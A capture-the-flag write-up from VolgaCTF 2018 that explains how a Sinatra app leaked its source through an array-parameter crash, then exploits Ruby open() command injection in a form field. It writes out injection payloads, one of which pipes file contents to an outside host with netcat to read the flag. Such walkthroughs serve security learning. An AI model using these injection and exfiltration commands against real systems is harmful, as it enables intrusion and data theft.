---
title: volgactf 2018 - Old Government
author: onionpsy
categories:
  - hacking
---

We started by checking the link on the header and we saw that an `id` is passed in the url with the id of the page: `page?id=36`. After some tries we found that we could crash the application by passing id as an array, like that : `page?id[]=36`.

```ruby
NoMethodError at /page
undefined method `to_i' for ["36"]:Array Did you mean? to_s to_a to_h
```

It gave us info that the website is powered by Sinatra, a ruby web framework.

On the backtrace, we could see part of the code.

### articles.erb
```ruby
case @id.to_i

    when 2
      erb :page2
    when 5
      erb :page5
    when 18
      erb :page18
    when 23
```

### app.rb
```ruby
        headers "Server" => ""
      	erb :index
      end

      get '/page' do
      	@id = params[:id]
        headers "Server" => ""

      	erb :articles

      end

      post '/page' do
      	@id = params[:id]
        headers "Server" => ""
      	erb :articles
      end
```

After a few tries on the pages, we found that the page with the id 18 has a form with 2 fields. One is waiting a valid url (`site`) and the other is an optional description (`description`). We used once again the `page?id[]=36` trick but through the POST this time. This gave us more informations about the code. The most interesting one is this function:

```ruby
  def siteValidator(site)
    begin
  	  r = open(site, :allow_redirections => :all)
	(...)
```

Judging by the name it seems that this one is ran on the site field of the post query. Judging by [OWASP - Ruby on Rails Cheatsheet](https://www.owasp.org/index.php/Ruby_on_Rails_Cheatsheet), `open` can be actually used to inject command.
After some tries we can see that it works:
 * `site=| ls` show `validated`
 * `site=| aaaa` show `error`

But because we don't have any sort of output, we decided to create a reverse shell using netcat (present on the server) using this syntax: `site=| <command> | netcat <ip> <port>`

After some directory listing, we saw the flag file:
`site=| cat ../../flag | netcat <ip> <port>`

Done!
